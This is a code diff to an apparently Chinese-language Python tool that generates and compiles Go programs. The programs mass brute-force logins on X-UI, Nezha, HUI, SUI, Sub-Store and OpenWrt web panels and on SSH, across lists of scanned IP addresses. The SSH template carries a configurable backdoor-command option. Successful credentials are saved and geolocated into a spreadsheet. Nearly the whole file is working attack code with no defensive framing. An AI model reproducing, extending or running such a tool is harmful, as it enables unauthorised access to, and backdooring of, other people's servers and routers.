@@ -28,40 +28,16 @@ XUI_GO_TEMPLATE_1 = '''
 package main
 
 import (
-	"bufio"
 	"context"
 	"encoding/json"
 	"fmt"
 	"io"
 	"net/http"
-	_ "net/http/pprof"
-	"os"
-	"os/signal"
 	"strings"
 	"sync"
 	"sync/atomic"
-	"syscall"
 	"time"
 )
-
-var wg sync.WaitGroup
-var semaphore = make(chan struct{}, {semaphore_size})
-var completedCount int64
-var shutdownRequest = make(chan struct{})
-var resultsChannel = make(chan string, 256)
-
-var bufferPool = sync.Pool{
-	New: func() interface{} { b := make([]byte, 4*1024); return &b },
-}
-
-var httpClient = &http.Client{
-	Transport: &http.Transport{
-		MaxIdleConns:        2000,
-		MaxIdleConnsPerHost: 1000,
-		IdleConnTimeout:     90 * time.Second,
-	},
-	Timeout: 10 * time.Second,
-}
 
 func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
 	payload := fmt.Sprintf("username=%s&password=%s", username, password)
@@ -72,15 +48,8 @@ func postRequest(ctx context.Context, url string, username string, password stri
 }
 
 func processIP(line string, usernames []string, passwords []string) {
-	defer func() {
-		atomic.AddInt64(&completedCount, 1)
-		<-semaphore
-		wg.Done()
-	}()
-	select {
-	case <-shutdownRequest: return
-	case semaphore <- struct{}{}:
-	}
+	defer func() { atomic.AddInt64(&completedCount, 1); <-semaphore; wg.Done() }()
+	select { case <-shutdownRequest: return; case semaphore <- struct{}{}: }
 
 	ipPort := strings.TrimSpace(line)
 	if ipPort == "" { return }
@@ -93,12 +62,12 @@ func processIP(line string, usernames []string, passwords []string) {
 			var resp *http.Response
 			var err error
 
-			ctx1, cancel1 := context.WithTimeout(context.Background(), 10*time.Second)
+			ctx1, cancel1 := context.WithTimeout(context.Background(), {timeout}*time.Second)
 			resp, err = postRequest(ctx1, fmt.Sprintf("http://%s:%s/login", ip, port), user, pass)
 			cancel1()
 
 			if err != nil {
-				ctx2, cancel2 := context.WithTimeout(context.Background(), 10*time.Second)
+				ctx2, cancel2 := context.WithTimeout(context.Background(), {timeout}*time.Second)
 				resp, err = postRequest(ctx2, fmt.Sprintf("https://%s:%s/login", ip, port), user, pass)
 				cancel2()
 			}
@@ -106,9 +75,7 @@ func processIP(line string, usernames []string, passwords []string) {
 			if err != nil { continue }
 
 			if resp.StatusCode == http.StatusOK {
-				bufPtr := bufferPool.Get().(*[]byte)
 				body, readErr := io.ReadAll(resp.Body)
-				bufferPool.Put(bufPtr)
 				resp.Body.Close()
 				if readErr != nil { continue }
 
@@ -131,28 +98,16 @@ func processIP(line string, usernames []string, passwords []string) {
 XUI_GO_TEMPLATE_2 = '''
 package main
 import (
-	"bufio"
 	"context"
 	"encoding/json"
 	"fmt"
 	"io"
 	"net/http"
-	_ "net/http/pprof"
-	"os"
-	"os/signal"
 	"strings"
 	"sync"
 	"sync/atomic"
-	"syscall"
 	"time"
 )
-var wg sync.WaitGroup
-var semaphore = make(chan struct{}, {semaphore_size})
-var completedCount int64
-var shutdownRequest = make(chan struct{})
-var resultsChannel = make(chan string, 256)
-var bufferPool = sync.Pool{ New: func() interface{} { b := make([]byte, 4*1024); return &b } }
-var httpClient = &http.Client{ Transport: &http.Transport{ MaxIdleConns: 2000, MaxIdleConnsPerHost: 1000, IdleConnTimeout: 90 * time.Second }, Timeout: 10 * time.Second }
 
 func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
 	data := map[string]string{"username": username, "password": password}
@@ -177,19 +132,17 @@ func processIP(line string, usernames []string, passwords []string) {
 		for _, pass := range passwords {
 			var resp *http.Response
 			var err error
-			ctx1, cancel1 := context.WithTimeout(context.Background(), 10*time.Second)
+			ctx1, cancel1 := context.WithTimeout(context.Background(), {timeout}*time.Second)
 			resp, err = postRequest(ctx1, fmt.Sprintf("http://%s:%s/api/v1/login", ip, port), user, pass)
 			cancel1()
 			if err != nil {
-				ctx2, cancel2 := context.WithTimeout(context.Background(), 10*time.Second)
+				ctx2, cancel2 := context.WithTimeout(context.Background(), {timeout}*time.Second)
 				resp, err = postRequest(ctx2, fmt.Sprintf("https://%s:%s/api/v1/login", ip, port), user, pass)
 				cancel2()
 			}
 			if err != nil { continue }
 			if resp.StatusCode == http.StatusOK {
-				bufPtr := bufferPool.Get().(*[]byte)
 				body, readErr := io.ReadAll(resp.Body)
-				bufferPool.Put(bufPtr)
 				resp.Body.Close()
 				if readErr != nil { continue }
 				var data map[string]interface{}
@@ -211,28 +164,16 @@ func processIP(line string, usernames []string, passwords []string) {
 XUI_GO_TEMPLATE_3 = '''
 package main
 import (
-	"bufio"
 	"context"
 	"encoding/json"
 	"fmt"
 	"io"
 	"net/http"
-	_ "net/http/pprof"
-	"os"
-	"os/signal"
 	"strings"
 	"sync"
 	"sync/atomic"
-	"syscall"
 	"time"
 )
-var wg sync.WaitGroup
-var semaphore = make(chan struct{}, {semaphore_size})
-var completedCount int64
-var shutdownRequest = make(chan struct{})
-var resultsChannel = make(chan string, 256)
-var bufferPool = sync.Pool{ New: func() interface{} { b := make([]byte, 4*1024); return &b } }
-var httpClient = &http.Client{ Transport: &http.Transport{ MaxIdleConns: 2000, MaxIdleConnsPerHost: 1000, IdleConnTimeout: 90 * time.Second }, Timeout: 10 * time.Second }
 
 func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
 	data := map[string]string{"username": username, "pass": password}
@@ -257,14 +198,12 @@ func processIP(line string, usernames []string, passwords []string) {
 
 	for _, user := range usernames {
 		for _, pass := range passwords {
-			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+			ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)
 			resp, err := postRequest(ctx, fmt.Sprintf("http://%s:%s/hui/auth/login", ip, port), user, pass)
 			cancel()
 			if err != nil { continue }
 			if resp.StatusCode == http.StatusOK {
-				bufPtr := bufferPool.Get().(*[]byte)
 				body, readErr := io.ReadAll(resp.Body)
-				bufferPool.Put(bufPtr)
 				resp.Body.Close()
 				if readErr != nil { continue }
 				var data map[string]interface{}
@@ -288,28 +227,16 @@ func processIP(line string, usernames []string, passwords []string) {
 XUI_GO_TEMPLATE_4 = '''
 package main
 import (
-	"bufio"
 	"context"
 	"encoding/json"
 	"fmt"
 	"io"
 	"net/http"
-	_ "net/http/pprof"
-	"os"
-	"os/signal"
 	"strings"
 	"sync"
 	"sync/atomic"
-	"syscall"
 	"time"
 )
-var wg sync.WaitGroup
-var semaphore = make(chan struct{}, {semaphore_size})
-var completedCount int64
-var shutdownRequest = make(chan struct{})
-var resultsChannel = make(chan string, 256)
-var bufferPool = sync.Pool{ New: func() interface{} { b := make([]byte, 4*1024); return &b } }
-var httpClient = &http.Client{ Transport: &http.Transport{ MaxIdleConns: 2000, MaxIdleConnsPerHost: 1000, IdleConnTimeout: 90 * time.Second }, Timeout: 10 * time.Second }
 
 func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
 	payload := map[string]string{"username": username, "password": password}
@@ -334,14 +261,12 @@ func processIP(line string, usernames []string, passwords []string) {
 
 	for _, user := range usernames {
 		for _, pass := range passwords {
-			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+			ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)
 			resp, err := postRequest(ctx, fmt.Sprintf("http://%s:%s/login", ip, port), user, pass)
 			cancel()
 			if err != nil { continue }
 			if resp.StatusCode == 200 {
-				bufPtr := bufferPool.Get().(*[]byte)
 				body, readErr := io.ReadAll(resp.Body)
-				bufferPool.Put(bufPtr)
 				resp.Body.Close()
 				if readErr != nil { continue }
 				var data map[string]interface{}
@@ -367,28 +292,16 @@ func processIP(line string, usernames []string, passwords []string) {
 XUI_GO_TEMPLATE_5 = '''
 package main
 import (
-	"bufio"
 	"context"
 	"encoding/json"
 	"fmt"
 	"io"
 	"net/http"
-	_ "net/http/pprof"
-	"os"
-	"os/signal"
 	"strings"
 	"sync"
 	"sync/atomic"
-	"syscall"
 	"time"
 )
-var wg sync.WaitGroup
-var semaphore = make(chan struct{}, {semaphore_size})
-var completedCount int64
-var shutdownRequest = make(chan struct{})
-var resultsChannel = make(chan string, 256)
-var bufferPool = sync.Pool{ New: func() interface{} { b := make([]byte, 4*1024); return &b } }
-var httpClient = &http.Client{ Transport: &http.Transport{ MaxIdleConns: 2000, MaxIdleConnsPerHost: 1000, IdleConnTimeout: 90 * time.Second }, Timeout: 10 * time.Second }
 
 func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
 	form := fmt.Sprintf("user=%s&pass=%s", username, password)
@@ -411,14 +324,12 @@ func processIP(line string, usernames []string, passwords []string) {
 
 	for _, user := range usernames {
 		for _, pass := range passwords {
-			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+			ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)
 			resp, err := postRequest(ctx, fmt.Sprintf("http://%s:%s/app/api/login", ip, port), user, pass)
 			cancel()
 			if err != nil { continue }
 			if resp.StatusCode == 200 {
-				bufPtr := bufferPool.Get().(*[]byte)
 				body, readErr := io.ReadAll(resp.Body)
-				bufferPool.Put(bufPtr)
 				resp.Body.Close()
 				if readErr != nil { continue }
 				var data map[string]interface{}
@@ -440,26 +351,13 @@ func processIP(line string, usernames []string, passwords []string) {
 XUI_GO_TEMPLATE_6 = '''
 package main
 import (
-	"bufio"
 	"fmt"
-	"net/http"
-	_ "net/http/pprof"
-	"os"
-	"os/signal"
 	"strings"
 	"sync"
 	"sync/atomic"
-	"syscall"
 	"time"
 	"golang.org/x/crypto/ssh"
 )
-var wg sync.WaitGroup
-var semaphore = make(chan struct{}, {semaphore_size})
-var completedCount int64
-var shutdownRequest = make(chan struct{})
-var resultsChannel = make(chan string, 256)
-var hmSuccessChannel = make(chan string, 100)
-var hmFailChannel = make(chan string, 100)
 
 var ENABLE_BACKDOOR = {enable_backdoor}
 var CUSTOM_BACKDOOR_CMDS = {custom_backdoor_cmds}
@@ -469,7 +367,7 @@ func trySSH(ip, port, username, password string) (*ssh.Client, bool) {
 		User:            username,
 		Auth:            []ssh.AuthMethod{ssh.Password(password)},
 		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
-		Timeout:         10 * time.Second,
+		Timeout:         {timeout} * time.Second,
 	}
 	client, err := ssh.Dial("tcp", ip+":"+port, config)
 	return client, err == nil
@@ -520,26 +418,15 @@ func processIP(line string, usernames []string, passwords []string) {
 XUI_GO_TEMPLATE_7 = '''
 package main
 import (
-	"bufio"
 	"context"
 	"fmt"
 	"io"
 	"net/http"
-	_ "net/http/pprof"
-	"os"
-	"os/signal"
 	"strings"
 	"sync"
 	"sync/atomic"
-	"syscall"
 	"time"
 )
-var wg sync.WaitGroup
-var semaphore = make(chan struct{}, {semaphore_size})
-var completedCount int64
-var shutdownRequest = make(chan struct{})
-var resultsChannel = make(chan string, 256)
-var httpClient = &http.Client{ Transport: &http.Transport{ MaxIdleConns: 2000, MaxIdleConnsPerHost: 1000, IdleConnTimeout: 90 * time.Second }, Timeout: 10 * time.Second }
 
 const successFlag = `{"status":"success","data"`
 
@@ -559,20 +446,6 @@ func sendRequest(ctx context.Context, fullURL string) (bool, error) {
 	return false, nil
 }
 
-func tryProtocols(ipPort, path string) (bool, string) {
-	cleanPath := strings.Trim(path, "/") + "/api/utils/env"
-	for _, scheme := range []string{"http", "https"} {
-		probeURL := fmt.Sprintf("%s://%s/%s", scheme, ipPort, cleanPath)
-		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
-		success, _ := sendRequest(ctx, probeURL)
-		cancel()
-		if success {
-			return true, fmt.Sprintf("%s://%s?api=%s://%s/%s\\n", scheme, ipPort, scheme, ipPort, strings.Trim(path, "/"))
-		}
-	}
-	return false, ""
-}
-
 func processIP(line string, usernames []string, paths []string) { // usernames is unused, paths are passwords
 	defer func() { atomic.AddInt64(&completedCount, 1); <-semaphore; wg.Done() }()
 	select { case <-shutdownRequest: return; case semaphore <- struct{}{}: }
@@ -581,7 +454,34 @@ func processIP(line string, usernames []string, paths []string) { // usernames i
 	if ipPort == "" { return }
 
 	for _, path := range paths {
-		if success, result := tryProtocols(ipPort, path); success {
+		cleanPath := strings.Trim(path, "/") + "/api/utils/env"
+		
+		var found bool
+		var result string
+		var wgProbe sync.WaitGroup
+		ctxProbe, cancelProbe := context.WithCancel(context.Background())
+		defer cancelProbe()
+
+		for _, scheme := range []string{"http", "https"} {
+			wgProbe.Add(1)
+			go func(s string) {
+				defer wgProbe.Done()
+				select { case <-ctxProbe.Done(): return; default: }
+				
+				probeURL := fmt.Sprintf("%s://%s/%s", s, ipPort, cleanPath)
+				ctx, cancel := context.WithTimeout(ctxProbe, {timeout}*time.Second)
+				defer cancel()
+
+				if success, _ := sendRequest(ctx, probeURL); success {
+					result = fmt.Sprintf("%s://%s?api=%s://%s/%s\\n", s, ipPort, s, ipPort, strings.Trim(path, "/"))
+					found = true
+					cancelProbe()
+				}
+			}(scheme)
+		}
+		wgProbe.Wait()
+		
+		if found {
 			resultsChannel <- result
 			return
 		}
@@ -593,30 +493,15 @@ func processIP(line string, usernames []string, paths []string) { // usernames i
 XUI_GO_TEMPLATE_8 = '''
 package main
 import (
-	"bufio"
 	"context"
 	"fmt"
 	"net/http"
 	"net/url"
-	_ "net/http/pprof"
-	"os"
-	"os/signal"
 	"strings"
 	"sync"
 	"sync/atomic"
-	"syscall"
 	"time"
 )
-var wg sync.WaitGroup
-var semaphore = make(chan struct{}, {semaphore_size})
-var completedCount int64
-var shutdownRequest = make(chan struct{})
-var resultsChannel = make(chan string, 256)
-var httpClient = &http.Client{
-	Transport: &http.Transport{ MaxIdleConns: 2000, MaxIdleConnsPerHost: 1000, IdleConnTimeout: 90 * time.Second },
-	Timeout: 10 * time.Second,
-	CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse },
-}
 
 func postRequest(ctx context.Context, urlStr, username, password, origin, referer string) (*http.Response, error) {
 	payload := fmt.Sprintf("luci_username=%s&luci_password=%s", username, password)
@@ -650,7 +535,7 @@ func processIP(line string, usernames []string, passwords []string) {
 		
 		for _, user := range usernames {
 			for _, pass := range passwords {
-				ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+				ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)
 				resp, err := postRequest(ctx, targetURL.String(), user, pass, origin, origin+"/")
 				cancel()
 				if err != nil { continue }
@@ -685,7 +570,7 @@ def get_ip_info(ip_port, retries=3):
                 data = r.json()
                 if data.get('status') == 'success':
                     return [ip_port, data.get('country', 'N/A'), data.get('regionName', 'N/A'), data.get('city', 'N/A'), data.get('isp', 'N/A')]
-            time.sleep(1.2) # Respect API rate limit
+            time.sleep(1.2)
         except requests.exceptions.RequestException:
             time.sleep(1)
     return [ip_port, '查询失败', '查询失败', '查询失败', '查询失败']
@@ -694,8 +579,7 @@ def adjust_column_width(ws):
     for col in ws.columns:
         max_len = 0
         for cell in col:
-            if cell.value:
-                max_len = max(max_len, len(str(cell.value)))
+            if cell.value: max_len = max(max_len, len(str(cell.value)))
         ws.column_dimensions[get_column_letter(col[0].column)].width = max_len + 2
 
 def print_progress(i, total, start_time, ip):
@@ -709,14 +593,9 @@ def print_progress(i, total, start_time, ip):
 
 def process_file(input_file, output_excel):
     try:
-        with open(input_file, 'r', encoding='utf-8') as f:
-            lines = [line.strip() for line in f if line.strip()]
-    except FileNotFoundError:
-        print(f"\n文件 {input_file} 未找到，跳过Excel生成。")
-        return
-    if not lines:
-        print("\n结果文件为空，跳过Excel生成。")
-        return
+        with open(input_file, 'r', encoding='utf-8') as f: lines = [l.strip() for l in f if l.strip()]
+    except FileNotFoundError: return print(f"\n文件 {input_file} 未找到，跳过Excel生成。")
+    if not lines: return print("\n结果文件为空，跳过Excel生成。")
 
     wb = Workbook(); ws = wb.active; ws.title = "IP信息"
     ws.append(['原始地址', 'IP/域名:端口', '用户名', '密码', '国家', '地区', '城市', 'ISP'])
@@ -724,19 +603,16 @@ def process_file(input_file, output_excel):
     start_time = time.time()
     for i, line in enumerate(lines, 1):
         parts = line.split(); addr, user, passwd = (parts + [''] * 3)[:3]
-        ip_port = re.search(r'https?://([^/\s]+)', addr)
-        ip_port = ip_port.group(1) if ip_port else addr.split()[0]
-        
+        ip_port = (re.search(r'https?://([^/\s]+)', addr) or [None, addr.split()[0]])[1]
         info = get_ip_info(ip_port)
-        ws.append([addr, user, passwd] + info[1:])
+        ws.append([addr, ip_port, user, passwd] + info[1:])
         print_progress(i, len(lines), start_time, ip_port)
 
     adjust_column_width(ws)
     wb.save(output_excel)
     print("\nIP信息查询完成！")
 
-if __name__ == "__main__":
-    process_file('xui.txt', 'xui.xlsx')
+if __name__ == "__main__": process_file('xui.txt', 'xui.xlsx')
 """
 
 # =========================== Main Python Script Logic ===========================
@@ -746,26 +622,81 @@ def input_with_default(prompt, default):
     val = input(f"{prompt}（默认 {default}）：").strip()
     return int(val) if val.isdigit() else default
 
-def input_filename_with_default(prompt, default):
-    val = input(f"{prompt}（默认 {default}）：").strip()
-    return val if val else default
-
 def to_go_string_array(items: list) -> str:
     if not items: return "[]string{}"
     escaped = [item.replace("\\", "\\\\").replace('"', '\\"') for item in items]
     return "[]string{\"" + "\", \"".join(escaped) + "\"}"
 
-def generate_go_code(template_content, semaphore_size, usernames, passwords, **kwargs):
-    COMMON_MAIN_LOGIC = '''
+def generate_go_code(template_content, semaphore_size, usernames, passwords, timeout, **kwargs):
+    COMMON_LOGIC = '''
+import (
+	"bufio"
+	"context"
+	"crypto/tls"
+	"fmt"
+	"net"
+	"net/http"
+	_ "net/http/pprof"
+	"os"
+	"os/signal"
+	"strings"
+	"sync"
+	"sync/atomic"
+	"syscall"
+	"time"
+)
+
+var wg sync.WaitGroup
+var semaphore = make(chan struct{}, {semaphore_size})
+var completedCount int64
+var shutdownRequest = make(chan struct{})
+var resultsChannel = make(chan string, 512)
+var hmSuccessChannel = make(chan string, 100)
+var hmFailChannel = make(chan string, 100)
+
+type dnsCacheEntry struct { addrs []string; err error; exp time.Time }
+var dnsCache = &sync.Map{}
+
+func cachedDialContext(ctx context.Context, network, addr string) (net.Conn, error) {
+	host, port, _ := net.SplitHostPort(addr)
+	if entry, ok := dnsCache.Load(host); ok {
+		e := entry.(dnsCacheEntry)
+		if time.Now().Before(e.exp) {
+			if e.err != nil { return nil, e.err }
+			for _, ip := range e.addrs {
+				if conn, err := net.Dial(network, net.JoinHostPort(ip, port)); err == nil { return conn, nil }
+			}
+		}
+	}
+	addrs, err := net.DefaultResolver.LookupHost(ctx, host)
+	dnsCache.Store(host, dnsCacheEntry{addrs: addrs, err: err, exp: time.Now().Add(10 * time.Minute)})
+	if err != nil { return nil, err }
+	for _, ip := range addrs {
+		if conn, err := net.Dial(network, net.JoinHostPort(ip, port)); err == nil { return conn, nil }
+	}
+	return nil, fmt.Errorf("failed to connect to any resolved address for %s", host)
+}
+
+var httpClient = &http.Client{
+	Transport: &http.Transport{
+		DialContext:           cachedDialContext,
+		MaxIdleConns:          4000,
+		MaxIdleConnsPerHost:   2000,
+		IdleConnTimeout:       90 * time.Second,
+		TLSHandshakeTimeout:   5 * time.Second,
+		ExpectContinueTimeout: 1 * time.Second,
+		ForceAttemptHTTP2:     false,
+		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
+	},
+	Timeout: time.Duration({timeout}) * time.Second,
+}
+
 func fileWriter(outputFile string, ch <-chan string, done chan bool) {
-	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err != nil { fmt.Printf("错误: 打开输出文件 %s 失败: %v\\n", outputFile, err); done <- true; return }
+	file, _ := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	defer file.Close()
 	writer := bufio.NewWriter(file)
 	defer writer.Flush()
-	for result := range ch {
-		writer.WriteString(result)
-	}
+	for result := range ch { writer.WriteString(result) }
 	done <- true
 }
 
@@ -777,12 +708,10 @@ func progressReporter(done <-chan struct{}) {
 		select {
 		case <-ticker.C:
 			count := atomic.LoadInt64(&completedCount)
-			elapsed := time.Since(startTime).Seconds()
-			rate := float64(count) / elapsed if elapsed > 0 else 0
+			rate := float64(count) / time.Since(startTime).Seconds()
 			fmt.Printf("\\r进度: 已完成 %d | 速率: %.2f 个/秒 ", count, rate)
 		case <-done:
-			count := atomic.LoadInt64(&completedCount)
-			fmt.Printf("\\n\\n最终完成: %d 个任务\\n", count)
+			fmt.Printf("\\n\\n最终完成: %d 个任务\\n", atomic.LoadInt64(&completedCount))
 			return
 		}
 	}
@@ -793,15 +722,13 @@ func main() {
 	stopSignal := make(chan os.Signal, 1)
 	signal.Notify(stopSignal, syscall.SIGINT, syscall.SIGTERM)
 	
-	if len(os.Args) < 2 { fmt.Println("错误: 请提供输入文件名。用法: ./program <input_file>"); return }
-	inputFile := os.Args[1]
-	file, err := os.Open(inputFile)
-	if err != nil { fmt.Printf("打开输入文件失败: %v\\n", err); return }
+	if len(os.Args) < 2 { os.Exit(1) }
+	file, err := os.Open(os.Args[1])
+	if err != nil { return }
 	defer file.Close()
 
 	usernames := {user_list}
 	passwords := {pass_list}
-	if len(usernames) == 0 || len(passwords) == 0 { fmt.Println("用户名或密码列表为空。"); return }
 
 	writerDone := make(chan bool); go fileWriter("xui.txt", resultsChannel, writerDone)
     var hmSuccessDone, hmFailDone chan bool
@@ -811,9 +738,8 @@ func main() {
     }
 
 	progressDone := make(chan struct{}); go progressReporter(progressDone)
-	go func() { <-stopSignal; fmt.Println("\\n\\n收到终止信号，正在停止派发新任务..."); close(shutdownRequest) }()
+	go func() { <-stopSignal; close(shutdownRequest) }()
 
-	fmt.Printf("开始处理文件 %s...\\n", inputFile)
 	scanner := bufio.NewScanner(file)
 	for scanner.Scan() {
 		select {
@@ -826,7 +752,6 @@ func main() {
 		}
 	}
 	END_LOOP:
-
 	wg.Wait()
 	close(resultsChannel); <-writerDone
     if {is_ssh_mode} { close(hmSuccessChannel); <-hmSuccessDone; close(hmFailChannel); <-hmFailDone }
@@ -834,10 +759,13 @@ func main() {
 	fmt.Println("\\n处理完成!")
 }
 '''
-    final_code = template_content + COMMON_MAIN_LOGIC
+    logic_part = "package main\n" + template_content.split("package main")[1]
+    final_code = logic_part.split("import (")[0] + COMMON_LOGIC + strings.Join(logic_part.split("import (")[1:], "import (")
+    
     final_code = final_code.replace("{semaphore_size}", str(semaphore_size)) \
                            .replace("{user_list}", to_go_string_array(usernames)) \
                            .replace("{pass_list}", to_go_string_array(passwords)) \
+                           .replace("{timeout}", str(timeout)) \
                            .replace("{is_ssh_mode}", "true" if kwargs.get("is_ssh", False) else "false")
     
     if kwargs.get("is_ssh", False):
@@ -867,16 +795,13 @@ def run_go_program(executable, input_file):
     cmd = ['./' + executable, input_file]
     if sys.platform == "linux": cmd = ["nice", "-n", "10"] + cmd
 
-    try:
-        subprocess.run(cmd, env=env)
-    except KeyboardInterrupt:
-        print("\n--- 手动中断Go程序执行 ---")
-    except Exception as e:
-        print(f"\n--- 执行Go程序时发生错误: {e} ---")
+    try: subprocess.run(cmd, env=env)
+    except KeyboardInterrupt: print("\n--- 手动中断Go程序执行 ---")
+    except Exception as e: print(f"\n--- 执行Go程序时发生错误: {e} ---")
 
 def clean_temp_files():
     print("--- 正在清理临时文件... ---")
-    for f in ['xui.go', 'ipcx.py', 'go.mod', 'go.sum', 'xui_executable', 'xui_executable.exe']: 
+    for f in ['xui.go', 'ipcx.py', 'go.mod', 'go.sum', 'xui_executable', 'xui_executable.exe']:
         if os.path.exists(f): os.remove(f)
 
 def choose_template_mode():
@@ -945,12 +870,15 @@ if __name__ == "__main__":
         input_file = input_filename_with_default("请输入源文件名", "1.txt")
         if not os.path.exists(input_file): sys.exit(f"❌ 错误: 文件 '{input_file}' 不存在。")
 
-        semaphore_size = input_with_default("爆破线程数", 1000)
+        semaphore_size = input_with_default("爆破线程数", 2000)
+        timeout = input_with_default("网络超时秒数", 8)
+        
         usernames, passwords = load_credentials(TEMPLATE_MODE)
         if not usernames or not passwords: sys.exit("❌ 错误: 用户名或密码字典为空。")
         
         all_templates = [XUI_GO_TEMPLATE_1, XUI_GO_TEMPLATE_2, XUI_GO_TEMPLATE_3, XUI_GO_TEMPLATE_4, XUI_GO_TEMPLATE_5, XUI_GO_TEMPLATE_6, XUI_GO_TEMPLATE_7, XUI_GO_TEMPLATE_8]
-        generate_go_code(all_templates[TEMPLATE_MODE-1], semaphore_size, usernames, passwords, **kwargs)
+        
+        generate_go_code(all_templates[TEMPLATE_MODE-1], semaphore_size, usernames, passwords, timeout, **kwargs)
         
         executable = compile_go_program()
         with open('ipcx.py', 'w', encoding='utf-8') as f: f.write(IPCX_PY_CONTENT)
@@ -960,7 +888,7 @@ if __name__ == "__main__":
 
         from datetime import datetime, timezone, timedelta
         time_str = (datetime.now(timezone.utc) + timedelta(hours=8)).strftime("%Y%m%d-%H%M")
-        mode_map = {1: "XUI", 2: "哪吒", 3: "HUI", 4: "咸蛋", 5: "SUI", 6: "ssh", 7: "substore", 8: "OpenWrt"}
+        mode_map = {1: "XUI", 2: "哪吒", 3: "HUI", 4: "咸蛋", 5: "SUI", 6: "SSH", 7: "Sub-Store", 8: "OpenWrt"}
         prefix = mode_map.get(TEMPLATE_MODE, "result")
         
         final_files = {}
